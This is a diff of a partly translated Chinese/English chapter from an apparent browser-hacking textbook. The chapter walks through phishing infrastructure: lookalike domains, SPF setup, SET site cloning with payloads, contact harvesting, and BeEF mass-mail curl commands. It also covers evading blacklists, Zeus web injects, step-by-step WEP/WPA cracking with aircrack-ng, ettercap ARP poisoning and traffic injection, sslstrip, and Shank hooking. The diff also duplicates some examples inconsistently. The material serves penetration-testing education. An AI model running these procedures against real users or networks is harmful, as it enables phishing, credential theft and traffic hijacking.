--   一旦你的托管环境配置并激活，你需要确保域名与内容主题相符。与虚拟计算的成本效益类似，域名注册在过去几年也因注册商竞争而变得更加负担得起。像 namecheap.com 或 godaddy.com 这样的注册商为 .com 域名提供约 10 美元/年的价格。你可以根据攻击主题注册类似 “europowerregulator.com” 或其衍生域名。
+当钓鱼内容需要通过 Internet 访问时，你需要考虑如何托管你的 Web 应用。近年来，在线虚拟机的成本稳步下降。Amazon 最小的计算单元每小时仅收费 US$0.02（2013 年价格，不含数据存储和传输费用）。如果你运行一个持续 40 小时的攻击，费用不到 1 美元。
 
--   **Social-Engineer Toolkit** 大卫·肯尼迪的 Social-Engineer Toolkit (SET) 也包含网站克隆功能。SET 不仅能克隆网页，还能注入恶意钩子，例如恶意 Java 小程序或 Metasploit 浏览器漏洞。你可以从 [`github.com/trustedsec/social-engineer-toolkit/`](https://github.com/trustedsec/social-engineer-toolkit/) 下载 SET。要利用 SET 的 Java 小程序攻击向量（包括网站克隆），运行 sudo ./set，然后按照以下步骤操作：
+一旦你的托管环境配置并激活，你需要确保域名与内容主题相符。与虚拟计算的成本效益类似，域名注册在过去几年也因注册商竞争而变得更加负担得起。像 `namecheap.com` 或 `godaddy.com` 这样的注册商为 `.com` 域名提供约 10 美元/年的价格。你可以根据攻击主题注册类似 “europowerregulator.com” 或其衍生域名。
 
-    Level1 **1.** 选择“网站攻击向量”选项。  
-    **2.** 选择“Java 小程序攻击方法”选项。  
-    **3.** 选择“站点克隆”选项。  
-    **4.** 输入你想克隆的 URL。  
-    **5.** 继续设置后续的载荷或反向 shell 选项。  
+### Social-Engineer Toolkit
 
-    /Level1 当 SET 的 Web 服务器开始监听后，你可以通过浏览器访问设备的 IP 地址。
+大卫·肯尼迪的 Social-Engineer Toolkit (`SET`) 也包含网站克隆功能。`SET` 不仅能克隆网页，还能注入恶意钩子，例如恶意钩子 Java 小程序或 Metasploit 浏览器漏洞。你可以从 [`github.com/trustedsec/social-engineer-toolkit/`](https://github.com/trustedsec/social-engineer-toolkit/) 下载 `SET`。要利用 `SET` 的 Java 小程序攻击向量（包括网站克隆），运行 `sudo ./set`，然后按照以下步骤操作：
+
+Level1
+**1.** 选择“网站攻击向量”选项。
+**2.** 选择“Java 小程序攻击方法”选项。
+**3.** 选择“站点克隆”选项。
+**4.** 输入你想克隆的 URL。
+**5.** 继续设置后续的载荷或反向 shell 选项。
+/Level1
+当 `SET` 的 Web 服务器开始监听后，你可以通过浏览器访问设备的 IP 地址。
 
 * * *
 
- end feature   start feature 
+end feature start feature
 
 * * *
 
- end feature 
+end feature
 
-
-
-
-URLCrazy，由 Andrew Horton 开发，是一个非常实用的工具，能够自动查找域名拼写错误及其他变体。它可从 [`www.morningstarsecurity.com/research/urlcrazy`](http://www.morningstarsecurity.com/research/urlcrazy) 获取，使用方式为执行：
+`URLCrazy`，由 Andrew Horton 开发，是一个非常实用的工具，能够自动查找域名拼写错误及其他变体。它可从 [`www.morningstarsecurity.com/research/urlcrazy`](http://www.morningstarsecurity.com/research/urlcrazy) 获取，使用方式为执行：
 
 ```
 ./urlcrazy <domain>
@@ -601,21 +550,21 @@ URLCrazy，由 Andrew Horton 开发，是一个非常实用的工具，能够自
 
 * * *
 
-end feature 
+end feature
 
 你也可以通过在缩短 URL 中封装你的网络钓鱼站点，增加一层混淆。这在针对移动设备时尤为有用。
 
 获得域名名称的好处还包括能够在 DNS 记录中配置 Sender Policy Framework（SPF）设置。SPF 记录可以以 SPF 或 TXT 记录的形式出现在 DNS，它允许域名指定哪些 IP 地址被允许代表其发送电子邮件。
 
-start figure 
+start figure
 
 **Figure 2-3:** URLCrazy 输出
 
 ![c02f003.tif](img/c02f003.png)
 
-end figure 
+end figure
 
-该方案最初是为了阻止垃圾邮件发送者伪造域名发送电子邮件而引入的。SMTP 服务器在收到特定 IP 地址的电子邮件时，可查询报告域名的 SPF 记录并验证该 IP 是否获准发送邮件。例如，microsoft.com 的 TXT 记录包含：
+该方案最初是为了阻止垃圾邮件发送者伪造域名发送电子邮件而引入的。SMTP 服务器在收到特定 IP 地址的电子邮件时，可查询报告域名的 SPF 记录并验证该 IP 是否获准发送邮件。例如，`microsoft.com` 的 TXT 记录包含：
 
 ```
 v=spf1 include:_spf-a.microsoft.com include:_spf-b.microsoft.com inc
@@ -626,13 +575,10 @@ lude:_spf-c.microsoft.com include:_spf-ssg-a.microsoft.com ip4:131.1
 
 该记录表明：
 
-*   v=spf1—使用的 SPF 版本为 1。
-
-*   include—对每个 include 语句查询相应 DNS 条目中的 SPF 记录。这样就可以引用其他来源的策略。
-
-*   ip4—对每个 ip4 语句匹配电子邮件是否来源于指定的 IP 范围。
-
-*   ~all—最终的兜底语句，执行 SOFTFAIL，对所有其他来源进行软失败。SOFTFAIL 由 ~ 标识，是一种 SPF 修饰符。修饰符可以是 +（PASS），?（NEUTRAL），‑（FAIL）或 ~（SOFTFAIL）。通常，标记为 SOFTFAIL 的消息会被接受，但可能会被标记。
+* `v=spf1`—使用的 SPF 版本为 1。
+* `include`—对每个 `include` 语句查询相应 DNS 条目中的 SPF 记录。这样就可以引用其他来源的策略。
+* `ip4`—对每个 `ip4` 语句匹配电子邮件是否来源于指定的 IP 范围。
+* `~all`—最终的兜底语句，执行 SOFTFAIL，对所有其他来源进行软失败。SOFTFAIL 由 `~` 标识，是一种 SPF 修饰符。修饰符可以是 `+`（PASS），`?`（NEUTRAL），`-`（FAIL）或 `~`（SOFTFAIL）。通常，标记为 SOFTFAIL 的消息会被接受，但可能会被标记。
 
 在为你的网络钓鱼站点域名正确配置 SPF 记录后，你就能发送不太可能被邮件传输代理和客户端标记为垃圾邮件的电子邮件。这引出了生成实际网络钓鱼邮件的下一阶段。
 
@@ -640,13 +586,13 @@ lude:_spf-c.microsoft.com include:_spf-ssg-a.microsoft.com ip4:131.1
 
 现在你已经完成了构建逼真的钓鱼站点的所有准备工作，需要一个方法来诱导目标访问该站点。传统上，主要手段是通过网络钓鱼电子邮件。Figure 2-1 是一个典型的在线银行钓鱼邮件的示例。但在针对性渗透中，你往往拥有更多关于目标的信息，从而可以在措辞和格式上更具体。
 
-首先，你需要生成目标电子邮件地址。利用 Google、LinkedIn 以及其他社交媒体站点是常见的第一步。工具如 Maltego、jigsaw.com、theHarvester 和 Recon-ng 可以帮助优化这一过程。
+首先，你需要生成目标电子邮件地址。利用 Google、LinkedIn 以及其他社交媒体站点是常见的第一步。工具如 `Maltego`、`jigsaw.com`、`theHarvester` 和 `Recon-ng` 可以帮助优化这一过程。
 
-start feature 
+start feature
 
 * * *
 
-**Harvesting Contacts** Recon-ng，可从 [`bitbucket.org/LaNMaSteR53/recon-ng`](https://bitbucket.org/LaNMaSteR53/recon-ng) 获取，是一个模块化的网络侦察框架，使用 Python 编写。该工具提供的控制台界面与 Metasploit 类似。要从 jigsaw.com 收集电子邮件，请执行以下步骤：
+**Harvesting Contacts** `Recon-ng`，可从 [`bitbucket.org/LaNMaSteR53/recon-ng`](https://bitbucket.org/LaNMaSteR53/recon-ng) 获取，是一个模块化的网络侦察框架，使用 Python 编写。该工具提供的控制台界面与 Metasploit 类似。要从 `jigsaw.com` 收集电子邮件，请执行以下步骤：
 
 ```
 recon-ng > use recon/contacts/gather/http/jigsaw
@@ -658,7 +604,7 @@ recon-ng > use reporting/csv_file
 recon-ng [csv_file] > run
 ```
 
-数据目录中应包含名为 results.csv 的文件，里面列有收集到的联系人。如果你拥有 LinkedIn API 密钥，还可以使用 recon/contacts/gather/http/linkedin_auth 模块。theHarvester 是另一个 Python 脚本，可下载自 [`www.edge-security.com/theharvester.php`](http://www.edge-security.com/theharvester.php)。类似 Recon-ng，theHarvester 可以利用公开搜索引擎和 API 驱动的存储库来构建电子邮件联系人列表。使用 theHarvester 的方法是：
+数据目录中应包含名为 `results.csv` 的文件，里面列有收集到的联系人。如果你拥有 LinkedIn API 密钥，还可以使用 `recon/contacts/gather/http/linkedin_auth` 模块。`theHarvester` 是另一个 Python 脚本，可下载自 [`www.edge-security.com/theharvester.php`](http://www.edge-security.com/theharvester.php)。类似 `Recon-ng`，`theHarvester` 可以利用公开搜索引擎和 API 驱动的存储库来构建电子邮件联系人列表。使用 `theHarvester` 的方法是：
 
 ```
 ./theHarvester.py -d <target domain> -l <limit number of results>\
@@ -667,17 +613,17 @@ recon-ng [csv_file] > run
 
 * * *
 
-end feature 
+end feature
 
 一旦你拥有电子邮件地址列表，就需要构建诱饵。与构建钓鱼站点类似，你需要花时间确保邮件的前提看起来真实可信。
 
 当然，你最终需要向目标发送邮件。一种方法是使用 BeEF 的社交工程大规模邮件发送功能。
 
-start feature 
+start feature
 
 * * *
 
-**Using BeEF’s Mass Mailer** BeEF 的大规模邮件功能需要一定的配置，但一旦设置完成，就能极大简化发送纯文本和 HTML 编码格式的多封邮件的过程。首先，你需要编辑 beef/extensions/social_engineering/config.yaml，特别是 mass_mailer 部分：
+**Using BeEF’s Mass Mailer** BeEF 的大规模邮件功能需要一定的配置，但一旦设置完成，就能极大简化发送纯文本和 HTML 编码格式的多封邮件的过程。首先，你需要编辑 `beef/extensions/social_engineering/config.yaml`，特别是 `mass_mailer` 部分：
 
 ```
 user_agent: “Microsoft-MacOutlook/12.12.0.111556”
@@ -690,7 +636,7 @@ from: “<from email address - for eg: marketing@europowerregulator.com>“
 password: “<SMTP password>“
 ```
 
-接下来需要配置电子邮件模板本身。在生成实际模板之前，需要配置邮件可能依赖的资源，例如图片。这同样在社交工程扩展的配置文件中完成。你可以在 BeEF 中找到名为 “edfenergy” 的示例。在同一 config.yaml 文件中，可以看到其配置：
+接下来需要配置电子邮件模板本身。在生成实际模板之前，需要配置邮件可能依赖的资源，例如图片。这同样在社交工程扩展的配置文件中完成。你可以在 BeEF 中找到名为 “edfenergy” 的示例。在同一 `config.yaml` 文件中，可以看到其配置：
 
 ```
 edfenergy:
@@ -713,39 +659,38 @@ edfenergy:
 
 * * *
 
-end feature 
+end feature
 
-这些设置主要指定模板中将被替换的图片，以及对应的 ID 引用。邮件模板位于 beef/extensions/social_engineering/mass_mailer/templates/edfenergy/，包含 mail.plain 和 mail.html 两个文件。这些文件采用简单的模板系统，在发送邮件时动态替换内容，包括本地图片的引用和收件人的名称。BeEF 大规模邮件发送中的图片并不通过网络引用，而是先下载后以 Base64 编码嵌入邮件正文。如果你查看 mail.html，会看到 “_\_name\_\_” 和 “_\_link\_\_” 之类的占位符，这些在提交大规模邮件命令时会被动态替换。和网页克隆一样，大规模邮件发送是通过 RESTful API 接口执行的，因此在 BeEF 运行后，打开新终端并执行以下 curl 命令：
+这些设置主要指定模板中将被替换的图片，以及对应的 ID 引用。邮件模板位于 `beef/extensions/social_engineering/mass_mailer/templates/edfenergy/`，包含 `mail.plain` 和 `mail.html` 两个文件。这些文件采用简单的模板系统，在发送邮件时动态替换内容，包括本地图片的引用和收件人的名称。BeEF 大规模邮件发送中的图片并不通过网络引用，而是先下载后以 Base64 编码嵌入邮件正文。如果你查看 `mail.html`，会看到 “_\_name\_\_” 和 “_\_link\_\_” 之类的占位符，这些在提交大规模邮件命令时会被动态替换。和网页克隆一样，大规模邮件发送是通过 RESTful API 接口执行的，因此在 BeEF 运行后，打开新终端并执行以下 `curl` 命令：
 
-``` 
+```
 curl -X POST -H "Content-Type: application/json" -d '{"template":"edfenergy","subject":"Your Subject","body":"Your Body"}' http://localhost:5000/beef/api/mass_mailer
-``` 
+```
 
-
-
-
-```curl -H "Content-Type: application/json; charset=UTF-8" \
+```
+curl -H "Content-Type: application/json; charset=UTF-8" \
 -d '{“template”:”edfenergy”,”subject”: "<Email subject>","fromname": "<Fromname>","link": "<URL to phishing site>","linktext": "<Fake link text>","recipients":[{ "<Target email account>": "<Target’s name>","<Target email account 2>": "<Target 2’s name>"}]}' \
   -X POST http://<BeEFURL>/api/seng/send_mails?token=<token>
 ```
 
 Breaking down the options, you can configure the following:
 
-*   template—Configures which template to use, in this instance, the edfenergy template.
+* `template`—Configures which template to use, in this instance, the edfenergy template.
+* `subject`—Sets the subject of the phishing e-mail.
 
-*   subject—Sets the subject of the phishing e-mail.
 
-*   fromname—Configures the name of the sender. This doesn’t necessarily have to match your “from” address from the global configuration.
 
-*   link—Sets the phishing site address.
+*   `fromname`—Configures the name of the sender. This doesn’t necessarily have to match your “from” address from the global configuration.
 
-*   linktext—Some of the templates will embed the phishing link, but display linktext instead.
+*   `link`—Sets the phishing site address.
 
-*   recipients—The recipients field is a set of values for the recipients broken apart by their e-mail address and their name. The name field will be populated into the templates. You can have as many recipients as you want here, separated by commas.
+*   `linktext`—Some of the templates will embed the phishing link, but display `linktext` instead.
 
-*   BeEFURL—The URL to your BeEF instance.
+*   `recipients`—The recipients field is a set of values for the recipients broken apart by their e-mail address and their name. The name field will be populated into the templates. You can have as many recipients as you want here, separated by commas.
 
-*   token—The BeEF RESTful API token. This is used to access the BeEF server.
+*   `BeEFURL`—The URL to your BeEF instance.
+
+*   `token`—The BeEF RESTful API token. This is used to access the BeEF server.
 
 Once executed, the BeEF console will report:
 
@@ -774,7 +719,7 @@ Generating QR codes is made extremely simple by using Google’s Chart API17. To
 
 [[`chart.googleapis.com/chart?cht=qr&chs=`](https://chart.googleapis.com/chart?cht=qr&chs=)300x300&chl=http://browserhacker.com](https://chart.googleapis.com/chart?cht=qr&chs=300x300&chl=http://browserhacker.com)
 
-Alternatively, you can leverage BeEF’s “QR Code Generator” module to generate the Google chart URLs for you. To configure this extension, edit the beef/extensions/qrcode/config.yaml file:
+Alternatively, you can leverage BeEF’s “QR Code Generator” module to generate the Google chart URLs for you. To configure this extension, edit the `beef/extensions/qrcode/config.yaml` file:
 
 ```
 enable: true
@@ -824,15 +769,13 @@ If your phishing campaign is targeted to a small enough audience, the likelihood
 
 The trick is to ensure that you balance the audience scope of your e-mail campaign and your phishing site appropriately. Target too many people, and your site may get reported quickly. Target too few, and you may not get any people visiting your phishing site.
 
-Another technique to help reduce the likelihood of your phishing site getting blacklisted is to implement firewall or .htaccess rules. This would be configured to only display the phishing content if it’s coming from your target’s organizational web proxy.
+Another technique to help reduce the likelihood of your phishing site getting blacklisted is to implement firewall or `.htaccess` rules. This would be configured to only display the phishing content if it’s coming from your target’s organizational web proxy.
 
 Advanced versions of this scheme were spotted in the wild in what RSA called the “bouncer phishing kit”.20 This phishing kit automated the distribution of dynamic phishing URLs to victims, and if you tried to visit the content without a unique ID, or too many times, it would return an HTTP 404 error message.
 
 As previously discussed, sometimes you can’t technically insert your initiating instructions into a vulnerable web application or gain access to a communication channel. This often leaves you with only the end users you can target. With the right motivation, people are more than willing to perform actions to their own detriment. Do not discount the power of using social engineering techniques to take control of web browsers.
 
 ## Using Man-in-the-Middle Attacks
-
-
 
 假设你利用的方法在目标浏览器中嵌入初始化控制代码，不需要依赖通信端点的滥用。一种较老的技术，即中间人攻击（Man-in-the-Middle attack，MitM），自人类开始通过不受信任的通道发送消息以来，一直是一种流行的攻击技术。
 
@@ -847,9 +790,13 @@ As previously discussed, sometimes you can’t technically insert your initiatin
 传统上，MitM 攻击发生在 OSI 模型的较低层，确实是在应用层（即 HTTP 等）之下。Man-in-the-Browser（MitB）攻击是传统 MitM 攻击的兄弟，完全在浏览器内部进行。大多数持续的 JavaScript 通信（钩子）逻辑的核心特征实际上是一种 MitB 攻击，体现出以下特性：
 
 *   `隐藏在用户之外`
+
 *   `隐藏在服务器之外`
+
 *   `能够修改当前页面的内容`
+
 *   `能够读取当前页面的内容`
+
 *   `不需要受害者介入`
 
 这种拦截方式也常见于银行恶意软件攻击（例如 Zeus 或 SpyEye，它们提供注入功能）。这些便捷功能允许 Botnet 操作者指定配置文件，描述如何以及注入什么到 HTTP(S) 响应中。注入完全在浏览器内部进行，且不破坏或干扰浏览器内的 SSL 控制。例如：
@@ -867,11 +814,13 @@ data_after
 data_end
 ```
 
-通用的 Zeus 配置文件会在浏览器访问 https://www.yourbank.com/ 以内的任何页面时激活。它会查找文本 `<div class='footer'>`，并在其之后插入新的 JavaScript 远程资源。这与你之前检查的初始控制示例是相同的。当该内容渲染后，浏览器会认为该内容来自合法网站。
+
+
+通用的 Zeus 配置文件会在浏览器访问 `https://www.yourbank.com/` 以内的任何页面时激活。它会查找文本 `<div class='footer'>`，并在其之后插入新的 JavaScript 远程资源。这与你之前检查的初始控制示例是相同的。当该内容渲染后，浏览器会认为该内容来自合法网站。
 
 如果攻击者能够在系统上执行进程，特别是当这发生在浏览器的相同处理空间内时，那么对于受害者来说局势基本上已经结束。这类恶意软件通常具备不止 HTML 注入的功能，通常还包括表单抓取、操作系统级别的键盘记录以及截图获取。
 
-### 无线攻击
+## 无线攻击
 
 无线网络技术的最大进步之一是无线网络的开发和爆炸式增长。正如 Uncle Ben 向蜘蛛侠所说：“With great power, comes great responsibility.”，拥有强大的技术带来巨大的责任。
 
@@ -879,7 +828,15 @@ data_end
 
 无线网络（尤其是 IEEE 802.11 系列）的最初威胁是攻击者窃听通过空中传输的通信内容。Fluhrer、Mantin 和 Shamir 在 2001 年首次发表了关于窃听无线网络流量的研究，这仅是在 802.11 标准初始 ratification 几年后。随后，展示绕过有线等效隐私（WEP）控制的工具相继发布。
 
-**802.11 安全控制** 自 IEEE 802.11 问世以来，安全控制被引入以降低无线传输的机密性、完整性或可用性丧失的可能性。随时间推移，安全界对这些控制的弱点进行了批判性分析。以下是无线控制及其缺陷的简要概述。**SSID 隐藏** 大多数路由器允许不广播其服务集标识符（SSID）。遗憾的是，为了使无线客户端能够运行，它们通常会请求连接到命名的 SSIDs，这实际上会泄露该信息。像 Kismet 或 Aircrack 这样的工具可以帮助你发现 SSIDs。**静态 IP 过滤** 与 SSID 隐藏类似，静态 IP 过滤可能看似限制了无线路由器的 DHCP 连接，但 IP 地址可以通过无线工具被发现，并手动配置在攻击者的无线接口上。**MAC 地址过滤** 与 IP 过滤面临相同的问题。攻击者使用无线工具确定已连接的 MAC 地址后，可以将自身的 MAC 地址修改为匹配其中一个已连接客户端的 MAC 地址。在 Windows 上，你可以在无线适配器的高级属性中配置“网络地址”设置来修改 MAC 地址。在 Linux 上，可以使用 ifconfig 命令修改 MAC 地址：
+### 802.11 安全控制
+
+自 IEEE 802.11 问世以来，安全控制被引入以降低无线传输的机密性、完整性或可用性丧失的可能性。随时间推移，安全界对这些控制的弱点进行了批判性分析。以下是无线控制及其缺陷的简要概述。
+
+**SSID 隐藏** 大多数路由器允许不广播其服务集标识符（SSID）。遗憾的是，为了使无线客户端能够运行，它们通常会请求连接到命名的 SSIDs，这实际上会泄露该信息。像 `Kismet` 或 `Aircrack` 这样的工具可以帮助你发现 SSIDs。
+
+**静态 IP 过滤** 与 SSID 隐藏类似，静态 IP 过滤可能看似限制了无线路由器的 DHCP 连接，但 IP 地址可以通过无线工具被发现，并手动配置在攻击者的无线接口上。
+
+**MAC 地址过滤** 与 IP 过滤面临相同的问题。攻击者使用无线工具确定已连接的 MAC 地址后，可以将自身的 MAC 地址修改为匹配其中一个已连接客户端的 MAC 地址。在 Windows 上，你可以在无线适配器的高级属性中配置“网络地址”设置来修改 MAC 地址。在 Linux 上，可以使用 `ifconfig` 命令修改 MAC 地址：
 
 ```
 ifconfig <interface> hw ether <MAC address>
@@ -891,14 +848,18 @@ OS X 与 Linux 类似：
 sudo ifconfig <interface> ether <MAC address>
 ```
 
-**WEP** 你可以使用 Aircrack-ng23 套件轻松破解 WEP 密钥：Level1 **1.** 启动能够注入流量的无线适配器的监听模式：
+**WEP** 你可以使用 `Aircrack-ng23` 套件轻松破解 WEP 密钥：Level1
+
+**1.** 启动能够注入流量的无线适配器的监听模式：
 
 ```
 airmon-ng start <adaptor - for example: wifi0>
  <wireless channel - for example: 9>
 ```
 
-这将把被动接口置于监听模式。 **2.** 使用监听模式适配器测试数据包注入。这通常是与 wifi0 不同的适配器，例如 Atheros 接口：
+这将把被动接口置于监听模式。
+
+**2.** 使用监听模式适配器测试数据包注入。这通常是与 wifi0 不同的适配器，例如 Atheros 接口：
 
 ```
 aireplay-ng -9 -e <SSID of target network>
@@ -906,7 +867,7 @@ aireplay-ng -9 -e <SSID of target network>
  <passive interface - for example: ath0>
 ```
 
- **3.** 开始捕获 WEP 初始化向量：
+**3.** 开始捕获 WEP 初始化向量：
 
 ```
 airodump-ng -c <wireless channel - for example: 9>
@@ -914,7 +875,7 @@ airodump-ng -c <wireless channel - for example: 9>
  -w output <passive interface – for example: ath0>
 ```
 
- **4.** 将自身的 MAC 地址关联到无线接入点：
+**4.** 将自身的 MAC 地址关联到无线接入点：
 
 ```
 aireplay-ng -1 0 -e <SSID of target network>
@@ -922,7 +883,7 @@ aireplay-ng -1 0 -e <SSID of target network>
  -h <Our MAC address> <passive interface - for example: ath0>
 ```
 
- **5.** 启动 Aireplay-ng 的 ARP 请求重放模式，生成 WEP 初始化向量：
+**5.** 启动 Aireplay-ng 的 ARP 请求重放模式，生成 WEP 初始化向量：
 
 ```
 aireplay-ng -3 -b <MAC of target access point>
@@ -930,7 +891,9 @@ aireplay-ng -3 -b <MAC of target access point>
  <passive interface - for example: ath0>
 ```
 
-/Level1 现在输出 cap 文件应正在增长，其中包含包括 WEP 初始化向量在内的流量。要在其内部破解 WEP 凭据，执行以下命令：
+/Level1
+
+现在输出 cap 文件应正在增长，其中包含包括 WEP 初始化向量在内的流量。要在其内部破解 WEP 凭据，执行以下命令：
 
 ```
 aircrack-ng -b <MAC of target access point> output*.cap
@@ -942,17 +905,18 @@ aircrack-ng -b <MAC of target access point> output*.cap
 aircrack-ng -K -b <MAC of target access point> output*.cap
 ```
 
+**WPA/WPA2** 与 WEP 破解不同，WPA/WPA2 破解只能在特定条件下进行。其中一种情况是 WPA 以预共享密钥（pre‑shared key）模式配置，即使用共享密码而非证书。你需要使用诸如 `airodump-ng` 之类的工具捕获 WPA/WPA2 认证握手。这意味着等待新客户端连接或强制已连接的客户端断开并重新连接。最后，你需要对握手进行暴力破解以获取预共享密钥。Level1
 
-
-
-**WPA/WPA2** 与 WEP 破解不同，WPA/WPA2 破解只能在特定条件下进行。其中一种情况是 WPA 以预共享密钥（pre‑shared key）模式配置，即使用共享密码而非证书。你需要使用诸如 `airodump-ng` 之类的工具捕获 WPA/WPA2 认证握手。这意味着等待新客户端连接或强制已连接的客户端断开并重新连接。最后，你需要对握手进行暴力破解以获取预共享密钥。Level1 **1.** 将能注入的无线适配器设置为监听模式：
+**1.** 将能注入的无线适配器设置为监听模式：
 
 ```
 airmon-ng start <适配器 - 例如：wifi0>
  <无线信道 - 例如：9>
 ```
 
-这将把被动接口置于监听模式。 **2.** 开始捕获 WPA 握手：
+这将把被动接口置于监听模式。
+
+**2.** 开始捕获 WPA 握手：
 
 ```
 airodump-ng -c <无线信道 - 例如：9>
@@ -975,11 +939,11 @@ aircrack-ng -w <密码字典文件>
  -b <目标接入点的 MAC> psk*.cap
 ```
 
-/Level1 
+/Level1
 
 * * *
 
- end feature 
+end feature
 
 尽管窃听网络流量可能有助于你获取敏感信息，但它不一定直接转化为数据篡改。为了将初始化代码嵌入网页流量，你需要超越单纯的窃听技术。
 
@@ -989,19 +953,19 @@ aircrack-ng -w <密码字典文件>
 
 下面是 Wireshark 中显示的 ARP 请求和响应示例，如同在 Figure 2-5 中所示。
 
- start figure 
+start figure
 
 **Figure 2-5:** Wireshark 中的 ARP 流量
 
 ![c02f005.tif](img/c02f005.png)
 
- end figure 
+end figure
 
 ARP 欺骗之所以可行，是因为 ARP 协议缺乏验证 ARP 流量的方法。ARP 欺骗之所以特别有效，是因为你不必等待广播请求 MAC 地址。
 
 你可以主动向目标机器发送“ gratuitous ARP ”消息，告诉它某个 IP 对应的 MAC 地址，从而更新目标本地的 ARP 缓存；随后所有后续的 IP 流量会被发送到你而不是受害者机器。
 
-Ettercap（由 Alberto Ornaghi 和 Marco Valleri 开发）<sup>27</sup> 是在本地网络上进行此类 MitM 攻击的较流行工具。除了 ARP 中毒攻击外，该工具还能用于 DHCP 欺骗、端口劫持、数据包过滤等功能。dsniff（由 Dug Song 开发）<sup>28</sup> 是一个独立的工具套件，提供与 Ettercap 类似的功能，包括用于捕获凭据的多种过滤器以及其他 MitM 攻击。
+`Ettercap`（由 Alberto Ornaghi 和 Marco Valleri 开发）<sup>27</sup> 是在本地网络上进行此类 MitM 攻击的较流行工具。除了 ARP 中毒攻击外，该工具还能用于 DHCP 欺骗、端口劫持、数据包过滤等功能。`dsniff`（由 Dug Song 开发）<sup>28</sup> 是一个独立的工具套件，提供与 Ettercap 类似的功能，包括用于捕获凭据的多种过滤器以及其他 MitM 攻击。
 
 如果上述 ARP 欺骗示例在使用对等技术的网络中进行，可能会导致系统瘫痪。下面的示例（以及所有示例）应谨慎使用。现在已经提醒，你可以通过以下命令在终端中使用 ettercap：
 
@@ -1012,21 +976,13 @@ ettercap -T -Q -M arp:remote -i <网络接口> /<target1>/ /<target2>/
 下面的属性会选择以下选项：
 
 * **‑T** — 以文本模式运行。
-
 * **‑Q** — 以超静默模式运行，抑制大量输出。
-
 * **‑M** — 执行 MitM 攻击。
-
 * **arp:remote** — 指定进行 ARP 中毒攻击，remote 选项允许你监听目标网关的远程 IP 流量。
-
 * **‑i** — 指定网络接口，例如 wlan0。
-
 * 两个目标让你指定想要中毒的 IP 地址集合，这可以是 IP 范围或整个子网。例如，要中毒子网中所有主机并针对通过网关的流量，使用 `/<网关 IP>/`。
 
 上述命令的输出类似于下面的示例，其中包括在本地网络中向 DropBox 客户端显示的 HTTP 响应：
-
-
-
 
 ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA
 
@@ -1035,17 +991,25 @@ Listening on en0... (Ethernet)
    en0 ->  60:C5:47:06:85:22       192.168.1.1     255.255.255.0
 
 SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+
 Privileges dropped to UID 65534 GID 65534...
 
    0 plugins (disabled by configure...)
+
   39 protocol dissectors
+
   53 ports monitored
+
 7587 mac vendor fingerprint
+
 1698 tcp OS fingerprint
+
 2183 known services
 
 Randomizing 255 hosts for scanning...
+
 Scanning the whole netmask for 255 hosts...
+
 * |===================================>| 100.00 %
 
 4 hosts added to the hosts list...
@@ -1055,27 +1019,35 @@ ARP poisoning victims:
  GROUP 1 : 192.168.1.254 00:04:ED:27:D3:8A
 
  GROUP 2 : ANY (all the hosts in the list)
+
 Starting Unified sniffing...
 
-
 Text only Interface activated...
-Hit 'h' for inline help
 
+Hit 'h' for inline help
 
 Packet visualization restarted...
 
-
 Sun Mar  3 11:24:11 2013
+
 TCP  108.160.160.162:80 --> 192.168.1.101:50113 | AP
 
 HTTP/1.1 200 OK.
+
 X-DB-Timeout: 120.
+
 Pragma: no-cache.
+
 Cache-Control: no-cache.
+
 Content-Type: text/plain.
+
 Date: Sun, 03 Mar 2013 03:24:08 GMT.
+
 Content-Length: 15.
+
 .
+
 {"ret": "punt"}
 
 In addition to simply ARP spoofing, ettercap includes plugins and filters that enable you to modify traffic as it passes through your system. This will come in very handy when you are injecting your initial controlling instructions into your target browser.
@@ -1110,17 +1082,15 @@ ettercap -T -Q -F hookfilter.ef
 
 By specifying two empty targets, ettercap will ARP spoof all the traffic it detects, not just target particular IP addresses. A word of caution if doing this in large densely populated subnets: You may suddenly become the recipient of a very large amount of traffic because every host in the subnet that is talking to any other host in the subnet will now send its traffic your way. This can inadvertently cause a denial of service within the network. Therefore selecting the gateway as one of the target sets is recommended, as it is likely most web traffic will be traversing the gateway.
 
- start feature 
+start feature
 
 * * *
 
-**sslstrip** Moxie Marlinspike’s sslstrip is a tool released in 2009 that transparently hijacks HTTP traffic. It achieves this by looking for HTTPS links and redirects, and then modifies them to use HTTP over a local proxy. You can run this software to tamper with and review traffic that was intended for HTTPS. Sslstrip itself does not include native ARP spoofing, but is easy enough to combine with arpspoof or ettercap. You can read more about sslstrip at [`www.thoughtcrime.org/software/sslstrip/`](http://www.thoughtcrime.org/software/sslstrip/) 
 
-* * *
 
- end feature 
+`sslstrip` Moxie Marlinspike’s sslstrip is a tool released in 2009 that transparently hijacks HTTP traffic. It achieves this by looking for HTTPS links and redirects, and then modifies them to use HTTP over a local proxy. You can run this software to tamper with and review traffic that was intended for HTTPS. `sslstrip` itself does not include native ARP spoofing, but is easy enough to combine with `arpspoof` or `ettercap`. You can read more about `sslstrip` at [`www.thoughtcrime.org/software/sslstrip/`](http://www.thoughtcrime.org/software/sslstrip/)
 
-Although ettercap is a great multi-purpose tool to perform a variety of MitM attacks, you’re primarily focused on injecting initial instructions into the target browser. The previous example leveraged ettercap, but thanks to research by Ryan Linn and Steve Ocepek,29 there’s an even quicker way to perform this attack.
+Although `ettercap` is a great multi-purpose tool to perform a variety of MitM attacks, you’re primarily focused on injecting initial instructions into the target browser. The previous example leveraged `ettercap`, but thanks to research by Ryan Linn and Steve Ocepek,29 there’s an even quicker way to perform this attack.
 
 The tool, known as Shank, leverages BeEF combined with Metasploit’s PacketFu library. It automates the insertion of BeEF’s initial controlling code into web traffic as it traverses the local subnet.
 
@@ -1132,7 +1102,7 @@ To perform this attack, you need to have BeEF installed and running and have the
 gem install packetfu
 ```
 
-After downloading the scripts from [`github.com/SpiderLabs/beef_injection_framework`](https://github.com/SpiderLabs/beef_injection_framework), you need to configure them to your environment. First, update the @beef_ip setting in shank.rb:
+After downloading the scripts from [`github.com/SpiderLabs/beef_injection_framework`](https://github.com/SpiderLabs/beef_injection_framework), you need to configure them to your environment. First, update the `@beef_ip` setting in `shank.rb`:
 
 ```
 DEBUG = true
@@ -1142,7 +1112,7 @@ ARP_TIMEOUT = 30
 @beef_pass = 'beef'
 ```
 
-Second, you need to update the autorun.rb file. This specifies what modules to run as soon as new browsers are connected (hooked) into BeEF. You can see within the @autorun_mods array the modules that will be executed automatically.
